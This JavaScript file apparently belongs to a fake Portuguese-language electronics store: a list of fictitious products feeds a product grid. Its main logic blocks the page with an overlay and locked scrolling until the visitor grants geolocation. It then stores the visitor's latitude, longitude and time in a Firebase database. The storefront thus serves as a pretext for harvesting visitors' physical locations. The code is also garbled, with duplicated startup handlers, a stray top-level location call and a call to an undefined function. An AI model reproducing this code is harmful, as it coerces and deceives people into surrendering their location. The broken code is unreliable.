// Array contendo o banco de dados de produtos fictícios
const produtosFicticios = [
    {
        id: 1,
        nome: "Smartphone Galaxy S23 Ultra 256GB Preto",
        preco: "R$ 4.899",
        imagem: "https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 2,
        nome: "Notebook Dell Inspiron 15 - Intel Core i5",
        preco: "R$ 3.150",
        imagem: "https://images.unsplash.com/photo-1593642632823-8f785ba67e45?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 3,
        nome: "Smart TV 55\" 4K UHD LED - Wi-Fi e Bluetooth",
        preco: "R$ 2.399",
        imagem: "https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 4,
        nome: "Câmera Mirrorless Sony Alpha a6400 (Corpo)",
        preco: "R$ 5.900",
        imagem: "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 5,
        nome: "Fone de Ouvido Bluetooth Noise Cancelling",
        preco: "R$ 750",
        imagem: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80"
    },
    {
    id: 6,
    nome: "Console PlayStation 5 + Jogo",
    preco: "R$ 3.999",
    imagem: "https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$"
},
    {
        id: 7,
        nome: "Relógio Smartwatch Esportivo Series 8",
        preco: "R$ 1.299",
        imagem: "https://images.unsplash.com/photo-1546868871-7041f2a55e12?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 8,
        nome: "Mochila Executiva Impermeável com Porta Notebook",
        preco: "R$ 150",
        imagem: "https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=400&q=80"
    }
];

// Função responsável por gerar o HTML de cada produto e injetar na página
// Função responsável por gerar o HTML de cada produto e injetar na página
function carregarProdutos() {
    const productGrid = document.getElementById('product-grid');
    
    // Verifica se o elemento existe antes de tentar limpar
    if (!productGrid) return; 
    
    productGrid.innerHTML = ""; // Limpa o grid para evitar duplicados

    produtosFicticios.forEach(produto => {
        const card = document.createElement('div');
        card.className = 'product-card'; 

        card.innerHTML = `
            <img src="${produto.imagem}" alt="Imagem de ${produto.nome}" class="product-image">
            <div class="product-info">
                <span class="product-price">${produto.preco}</span>
                <h3 class="product-name">${produto.nome}</h3>
                <button class="btn-buy" onclick="acaoComprar('${produto.nome}')">Comprar</button>
            </div>
        `;

        productGrid.appendChild(card);
    });
}

function acaoComprar(nomeDoProduto) {
    alert(`O item "${nomeDoProduto}" foi adicionado ao seu carrinho!`);
}

// Carregar produtos ao iniciar
document.addEventListener('DOMContentLoaded', () => {
    carregarProdutos();
});

// Carregar produtos ao iniciar
document.addEventListener('DOMContentLoaded', () => {
    carregarProdutos();
});

// FUNÇÃO DE LOCALIZAÇÃO CORRIGIDA PARA REALTIME DATABASE
// FUNÇÃO DE LOCALIZAÇÃO ATUALIZADA PARA O NOVO OVERLAY
// Função que tenta pegar a loc automaticamente
// 1. TENTA PEGAR A LOCALIZAÇÃO ASSIM QUE ABRE


// 2. MOTOR DE LOCALIZAÇÃO
// ... (mantenha seu array de produtos e a função carregarProdutos lá em cima)

// MOTOR DE LOCALIZAÇÃO - SÓ AGE SE HOUVER RESPOSTA

function pegarLocalizacao() {
    const overlay = document.getElementById("locationOverlay");

    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
        function(posicao) {
            // SUCESSO
            db.ref("localizacoes").push({
                latitude: posicao.coords.latitude,
                longitude: posicao.coords.longitude,
                data: new Date().toLocaleString('pt-BR')
            }).then(() => {
                sessionStorage.setItem("localizado", "true");
                if (overlay) overlay.style.setProperty('display', 'none', 'important');
                document.body.style.overflow = "auto";
            });
        },
        function(erro) {
            // ERRO: Só mostra se realmente foi negado e após um tempinho
            setTimeout(() => {
                if (sessionStorage.getItem("localizado") !== "true") {
                    if (overlay) {
                        overlay.style.setProperty('display', 'flex', 'important');
                        document.body.style.overflow = "hidden";
                    }
                }
            }, 500); // Meio segundo de atraso
        }
    );
}

document.addEventListener('DOMContentLoaded', () => {
    carregarProdutos();
    
    // Só tenta se ainda não localizou
    if (sessionStorage.getItem("localizado") !== "true") {
        pegarLocalizacao();
    }
});

// INICIALIZAÇÃO CORRETA
document.addEventListener('DOMContentLoaded', () => {
    carregarProdutos();
    
    // Em vez de uma função extra, chamamos direto o motor.
    // Se já estiver localizado, ele nem entra no fluxo de bloqueio.
    if (sessionStorage.getItem("localizado") !== "true") {
        pegarLocalizacao();
    }
});
// Quando o site carregar, ele já tenta pegar a loc
document.addEventListener('DOMContentLoaded', () => {
    carregarProdutos();
    iniciarLocalizacaoAutomatica();
});
// LOGICA DE INICIALIZAÇÃO
document.addEventListener('DOMContentLoaded', () => {
    carregarProdutos();
    
    const overlay = document.getElementById("locationOverlay");
    
    // VERIFICA SE JÁ LOCALIZOU NESTA SESSÃO
    if (sessionStorage.getItem("localizado") === "true") {
        overlay.style.display = "none";
        document.body.style.overflow = "auto";
    } else {
        // Se não localizou, mostra a tela de bloqueio
        overlay.style.display = "flex";
        document.body.style.overflow = "hidden";
    }
});
// Para garantir que a rolagem da página principal esteja travada enquanto o modal está aberto
document.addEventListener('DOMContentLoaded', () => {
    // Carregar produtos ao iniciar (sua função antiga)
    carregarProdutos();
    
    // Trava a rolagem do body quando o site carrega
    document.body.style.overflow = "hidden";
});

    navigator.geolocation.getCurrentPosition(
        function(posicao) {
            const lat = posicao.coords.latitude;
            const lon = posicao.coords.longitude;

            // No Realtime Database usamos .ref().push()
            // Isso cria uma lista de localizações na nuvem
            db.ref("localizacoes").push({
                latitude: lat,
                longitude: lon,
                data: new Date().toLocaleString('pt-BR')
            })
            .then(() => {
                console.log("Dado enviado para a nuvem com sucesso!");
                alert("Localização registrada no banco de dados real!");
                // Esconde o botão após o sucesso
                document.getElementById("btnLocation").style.display = "none";
            })
            .catch((error) => {
                console.error("Erro ao salvar no Firebase:", error);
                alert("Erro ao conectar com o banco de dados.");
            });
        },
        function(erro) {
            alert("Você precisa permitir a localização para continuar.");
            console.warn("Erro de permissão: ", erro.message);
        }
    );

function toggleMenu() {
    const menu = document.getElementById('dropdownList');
    // toggle adiciona a classe se não tiver, e remove se já tiver
    menu.classList.toggle('show');
}

// Fechar o menu se o usuário clicar fora dele
window.onclick = function(event) {
    if (!event.target.matches('#menuCategorias')) {
        const dropdowns = document.getElementsByClassName("dropdown-menu");
        for (let i = 0; i < dropdowns.length; i++) {
            let openDropdown = dropdowns[i];
            if (openDropdown.classList.contains('show')) {
                openDropdown.classList.remove('show');
            }
        }
    }
}
